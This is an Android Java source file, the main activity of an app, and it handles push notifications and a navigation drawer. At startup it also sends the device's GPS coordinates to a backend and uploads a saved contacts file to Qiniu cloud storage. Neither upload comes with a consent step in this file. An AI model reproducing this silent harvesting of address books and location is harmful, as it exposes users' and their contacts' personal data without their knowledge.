package com.load.third.jqm.activity;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.widget.DrawerLayout;
import android.util.Log;
import android.view.View;
import android.widget.FrameLayout;

import com.igexin.sdk.PushManager;
import com.load.third.jqm.R;
import com.load.third.jqm.activity.home.GetuiDialogActivity;
import com.load.third.jqm.bean.UserDao;
import com.load.third.jqm.bean.newBean.QiniuName;
import com.load.third.jqm.bean.newBean.QiniuToken;
import com.load.third.jqm.fragment.HomeFragment;
import com.load.third.jqm.fragment.MineFragment;
import com.load.third.jqm.httpUtil.QiNiuGetUtils;
import com.load.third.jqm.newHttp.ApiException;
import com.load.third.jqm.newHttp.Apis;
import com.load.third.jqm.newHttp.BaseResponse;
import com.load.third.jqm.newHttp.CommonObserver;
import com.load.third.jqm.newHttp.UrlParams;
import com.load.third.jqm.service.GetuiIntentService;
import com.load.third.jqm.service.GetuiPushService;
import com.load.third.jqm.tips.ToastUtils;
import com.load.third.jqm.utils.IntentUtils;
import com.load.third.jqm.utils.StringUtils;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import butterknife.BindView;
import butterknife.ButterKnife;
import io.reactivex.Observable;
import io.reactivex.functions.Function;
import io.reactivex.schedulers.Schedulers;

import static com.load.third.jqm.service.GetuiIntentService.payloadData;

public class MainActivity extends BaseActivity {
    private static final int REQUEST_PERMISSION = 1001;
    private static final int REQUEST_PERMISSION_LOCATION = 1002;

    @BindView(R.id.ll_fragment_home)
    FrameLayout llFragmentHome;
    @BindView(R.id.ll_fragment_mine)
    FrameLayout llFragmentMine;
    @BindView(R.id.drawer_layout)
    DrawerLayout drawerLayout;

    private static Context context;
    private static HomeFragment homeFragment;
    private MineFragment mineFragment;
    private long waitTime = 2000;
    private long touchTime = 0;

    private String qiniuToken;
    private String qiniuName;
    private String qiniuUrl;
    private String txtPath;
    @SuppressLint("HandlerLeak")
    private Handler handler = new Handler() {
        public void handleMessage(Message msg) {
            switch (msg.what) {
                //上传文件共以下步骤,123在QiNiuGetUtils中实现
                //1、获取七牛token
                //2、获取七牛文件名
                //3、上传文件到七牛云
                //4、上传七牛云成功后，返回的链接上传至后台
//                case QiNiuGetUtils.MSG_GET_QINIU_TOKEN:
//                    qiniuToken = (String) msg.obj;
//                    if (StringUtils.isNotBlank(qiniuToken)) {
//                        QiNiuGetUtils.getQiNiuName(context, handler, ".txt");
//                    }
//                    break;
//                case QiNiuGetUtils.MSG_GET_QINIU_NAME:
//                    qiniuName = (String) msg.obj;
//                    if (StringUtils.isNotBlank(qiniuName) && StringUtils.isNotBlank(txtPath)) {
//                        QiNiuGetUtils.uploadToQianNiuYun(context, handler, qiniuToken, qiniuName, txtPath);
//                    }
//                    break;
                case QiNiuGetUtils.MSG_GET_QINIU_UPLOAD:
                    qiniuUrl = (String) msg.obj;
                    if (StringUtils.isNotBlank(qiniuUrl)) {
                        postContacts(qiniuUrl);
                    }
                    break;
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ButterKnife.bind(this);
        context = this;
        initView();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (StringUtils.isNotBlank(payloadData)) {
            IntentUtils.toActivity(context, GetuiDialogActivity.class);
        }
        int[] a = new int[]{123, 232};
    }

    private void initView() {
        homeFragment = new HomeFragment();
        mineFragment = new MineFragment();
        getFragmentManager().beginTransaction().replace(R.id.ll_fragment_home, homeFragment).commit();
        getFragmentManager().beginTransaction().replace(R.id.ll_fragment_mine, mineFragment).commit();
        setDrawerLayout();
        setGeTui();
        requestPermissionLocation();
        postContactsTxt();
    }

    public void openMineDrawer() {
        drawerLayout.openDrawer(llFragmentMine);
    }

    private void setDrawerLayout() {
        drawerLayout.addDrawerListener(new DrawerLayout.DrawerListener() {
            @Override
            public void onDrawerSlide(View drawerView, float slideOffset) {
            }

            @Override
            public void onDrawerOpened(View drawerView) {
                if (drawerView == llFragmentMine) {
                    mineFragment.onResume();
                }
            }

            @Override
            public void onDrawerClosed(View drawerView) {
                if (drawerView == llFragmentMine) {
                    homeFragment.onResume();
                }
            }

            @Override
            public void onDrawerStateChanged(int newState) {
            }
        });
    }

    //设置个推
    private void setGeTui() {
        PackageManager pkgManager = getPackageManager();
        boolean sdCardWritePermission = pkgManager.checkPermission(
                Manifest.permission.WRITE_EXTERNAL_STORAGE, getPackageName()) == PackageManager.PERMISSION_GRANTED;
        boolean phoneSatePermission = pkgManager.checkPermission(
                Manifest.permission.READ_PHONE_STATE, getPackageName()) == PackageManager.PERMISSION_GRANTED;
        if (Build.VERSION.SDK_INT >= 23 && !sdCardWritePermission || !phoneSatePermission) {
            requestPermission();
        } else {
            PushManager.getInstance().initialize(this.getApplicationContext(), GetuiPushService.class);
        }
        PushManager.getInstance().registerPushIntentService(this.getApplicationContext(), GetuiIntentService.class);
    }

    //请求个推需要的权限 读取文件权限
    private void requestPermission() {
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_PHONE_STATE,},
                REQUEST_PERMISSION);
    }

    //请求权限 获取地理信息权限
    private void requestPermissionLocation() {
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION},
                    REQUEST_PERMISSION_LOCATION);
        } else {
            getLocation();
        }
    }

    private String locationProvider;

    private void getLocation() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        //获取所有可用的位置提供器
        List<String> providers = locationManager.getProviders(true);
        if (providers.contains(LocationManager.GPS_PROVIDER)) {
            locationProvider = LocationManager.GPS_PROVIDER;
        } else if (providers.contains(LocationManager.NETWORK_PROVIDER)) {
            locationProvider = LocationManager.NETWORK_PROVIDER;
        } else {
            Log.e("msg", "没有可用的位置提供器");
            return;
        }
        //获取Location
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            Location location = locationManager.getLastKnownLocation(locationProvider);
            if (location != null) {
                postPosition(location.getLatitude() + "", location.getLongitude() + "");
                Log.i("msg", "维度：" + location.getLatitude() + "经度：" + location.getLongitude());
            }
        }
    }

    //上传经纬度
    private void postPosition(String latitude, String longitude) {
        Map<String, Object> params = new HashMap<>();
        params.put("latitude", latitude);
        params.put("longitude", longitude);
        submitTask(apiRetrofit.getPosition(UrlParams.getUrl(Apis.postPosition.getUrl(), params)), new CommonObserver() {
            @Override
            public void doSuccess(BaseResponse result) {
            }

            @Override
            public void doFail(String msg) {
                doFinish();
            }
        });
    }

    //判断是否需要上传通讯录，并上传
    private void postContactsTxt() {
        if (StringUtils.isNotBlank(UserDao.getInstance(context).getToken())
                && UserDao.getInstance(context).getAddress_list() == false) {
            Log.d("http_msg", "需要上传通讯录");
            SharedPreferences sp = getSharedPreferences("contactsTxt", Context.MODE_PRIVATE);
            txtPath = sp.getString("txtPath", "");
            Log.d("http_msg", "本地通讯录文件地址：" + txtPath);
            if (StringUtils.isNotBlank(txtPath)) {
                apiRetrofit.getQiNiuToken(Apis.getQiNiuToken.getUrl())
                        .flatMap(new Function<BaseResponse<QiniuToken>, Observable<BaseResponse<QiniuName>>>() {

                            @Override
                            public Observable<BaseResponse<QiniuName>> apply(BaseResponse<QiniuToken> response) throws Exception {
                                qiniuToken = response.getData().getUptoken();
                                if (StringUtils.isNotBlank(qiniuToken)) {
                                    return apiRetrofit.getQiNiuName(Apis.getQiNiuName.getUrl());
                                } else {
                                    return Observable.error(new ApiException(response.getMessage()));
                                }
                            }
                        })
                        .subscribeOn(Schedulers.io())
                        .subscribe(new CommonObserver<QiniuName>() {
                            @Override
                            public void doSuccess(BaseResponse<QiniuName> result) {
                                if (result != null) {
                                    qiniuName = result.getData().getFileName() + ".text";
                                    if (StringUtils.isNotBlank(qiniuName) && StringUtils.isNotBlank(txtPath)) {
                                        QiNiuGetUtils.uploadToQianNiuYun(context, handler, qiniuToken, qiniuName, txtPath);
                                    }
                                }

                            }
                        });
            }
        }
    }

    //上传七牛云成功后，返回的链接上传至后台
    private void postContacts(String url) {
        Map<String, Object> params = new HashMap<>();
        params.put("addressList", url);
        submitTask(apiRetrofit.getContacts(UrlParams.getUrl(Apis.postContacts.getUrl(), params)), new CommonObserver<String>() {
            @Override
            public void doSuccess(BaseResponse<String> result) {
                Log.d("http_msg", "通讯录上传成功");
            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == REQUEST_PERMISSION) {
            if ((grantResults.length == 2 && grantResults[0] == PackageManager.PERMISSION_GRANTED
                    && grantResults[1] == PackageManager.PERMISSION_GRANTED)) {
                PushManager.getInstance().initialize(this.getApplicationContext(), GetuiPushService.class);
            } else {
                PushManager.getInstance().initialize(this.getApplicationContext(), GetuiPushService.class);
            }
        } else if (requestCode == REQUEST_PERMISSION_LOCATION) {
            getLocation();
        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public void onBackPressed() {
        long currentTime = System.currentTimeMillis();
        if ((currentTime - touchTime) >= waitTime) {
            ToastUtils.showToast(this, "再按一次退出");
            touchTime = currentTime;
        } else {
            System.exit(0);
        }
    }
}
